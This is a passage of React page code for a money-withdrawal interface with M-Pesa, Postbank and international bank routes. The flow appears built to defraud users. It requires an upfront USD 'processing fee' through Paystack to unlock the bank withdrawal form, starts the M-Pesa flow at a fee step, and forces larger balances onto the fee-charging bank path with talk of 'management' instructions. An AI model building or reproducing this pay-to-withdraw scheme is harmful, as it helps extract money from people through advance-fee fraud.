    const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Choose your method" icon="🌍" accent={accent}>
        {gate === 'mpesa' && overLimit && (
          <>
            <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
              Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with a bank withdrawal below.
            </div>
            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
              🏦 Continue with a bank withdrawal
            </button>
          </>
        )}
        {gate === 'mpesa' && !overLimit && (
          <>
            <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
              For faster, check-free payouts we recommend <strong>M-Pesa (Safaricom)</strong> where available — it’s instant and avoids the extra verification checks that bank transfers require. Only use a <strong>bank</strong> if you can’t use M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
            </div>
            <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
            <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
              ✅ Yes, withdraw with M-Pesa (recommended)
            </button>
            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('management')}>
              🏦 No, I want a bank withdrawal
            </button>
          </>
        )}
        {gate === 'management' && (
          <>
            <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
              Bank withdrawals are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
            </div>
            <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via the bank?</div>
            <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
              📲 No — take me to M-Pesa
            </button>
            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
              🏦 Yes, management asked me — continue
            </button>
            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('mpesa')}>← Back</button>
          </>
        )}
        {gate === 'fee' && (
          <>
            <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
              A one-time <strong>processing fee of ${BANK_FEE_USD} USD</strong> (≈ <strong>KES {BANK_FEE_KES.toLocaleString()}</strong>) is required for your bank withdrawal to be processed successfully. The amount is converted to KES automatically.
            </div>
            <div className="pay-amount">
              <div className="pay-amount-label">Bank Withdrawal Processing Fee</div>
              <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${BANK_FEE_USD} USD</div>
              <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks the withdrawal form</div>
            </div>
            <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
              {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
            </button>
            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>← Back to Dashboard</button>
            <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
          </>
        )}
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="🌍" accent="linear-gradient(135deg, #1D4ED8, #2563EB)">
      <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF', marginBottom: 20 }}>
        {homeBanks.length ? (
          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown — or search for a different bank. Our payments team is notified automatically when you submit.</>
        ) : (
          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
        )}
      </div>

      <div className="pay-phone-label">Account Holder Name</div>
      <input className="pay-phone-input" type="text" value={accountName}
        onChange={e => { setAccountName(e.target.value); setErrors(p => ({ ...p, accountName: undefined })); }}
        placeholder="e.g. John Brown" style={{ borderColor: errors.accountName ? '#ef4444' : undefined }} />
      {errors.accountName && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.accountName}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Bank</div>
      <div style={{ position: 'relative' }}>
        <button type="button" className="pay-phone-input" onClick={() => setBankOpen(o => !o)}
          style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#ef4444' : undefined }}>
          {selectedBank ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
              <span style={{ fontSize: 18, lineHeight: 1 }}>{selectedBank.flag}</span>
              <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
              <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
            </span>
          ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
          <span style={{ color: '#9ca3af', fontSize: 12 }}>{bankOpen ? '▲' : '▼'}</span>
        </button>
        {bankOpen && (
          <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
              <span style={{ fontSize: 16 }}>🔍</span>
              <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
            </div>
            <div style={{ maxHeight: 240, overflowY: 'auto' }}>
              {filteredBanks.length === 0 && <div style={{ padding: 16, textAlign: 'center', color: '#9ca3af', fontSize: 13 }}>No banks found</div>}
              {filteredBanks.map(b => {
                const active = selectedBank && selectedBank.id === b.id;
                return (
                  <button key={b.id} type="button" onClick={() => selectBank(b)}
                    style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#EFF6FF' : '#fff' }}>
                    <span style={{ fontSize: 20, lineHeight: 1, width: 24, textAlign: 'center' }}>{b.flag}</span>
                    <span style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                      <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                    </span>
                    {active && <span style={{ color: '#2563EB' }}>✓</span>}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </div>
      {errors.bank && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
      <input className="pay-phone-input" type="text" value={accountNumber}
        onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
        placeholder={selectedBank ? selectedBank.ph : 'Select a bank first'} disabled={!selectedBank}
        style={{ borderColor: accountNumber && !acctValid ? '#ef4444' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
      {selectedBank && (
        <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#ef4444' : '#9ca3af' }}>
          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Format for ${selectedBank.name}: ${selectedBank.ph}`}
        </div>
      )}

      {formValid ? (
        <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
          {sending ? <><span className="spinner" /> Submitting…</> : '💸 Submit Withdrawal Request'}
        </button>
      ) : (
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
          {!accountName.trim() ? 'Enter your name to continue' : !selectedBank ? 'Select your bank to continue' : 'Enter a valid account number to reveal Submit'}
        </div>
      )}
      <div className="pay-secure">🔐 Your account details are encrypted and secure</div>
    </FlowShell>
  );
}

export default function WithdrawPage() {
  const router = useRouter();
  const { user, ready } = useUser();
  const method = router.query.method;
  const stepQ  = router.query.step;

  if (!ready || !user) {
    return <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--white-off)' }}>
      <div className="spinner" style={{ width: 40, height: 40, borderTopColor: 'var(--green)', borderColor: 'var(--gray-light)', borderWidth: 3 }} />
    </div>;
  }

  if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
  if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
  if (method === 'international')  return <InternationalFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;

  // Chooser
  const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
  return (
    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="💸">
      {overLimit && (
        <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB', marginBottom: 14 }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
      )}
      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
        📲 Withdraw with M-Pesa
      </button>
      {overLimit && <div style={{ fontSize: 12, color: '#B45309', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances — please use a bank option below.</div>}
      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
        🏦 Withdraw with Postbank Kenya
      </button>
      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1D4ED8, #2563EB)' }} onClick={() => router.push('/withdraw?method=international')}>
        🌍 Withdraw from Other Countries
      </button>
    </FlowShell>
  );
}
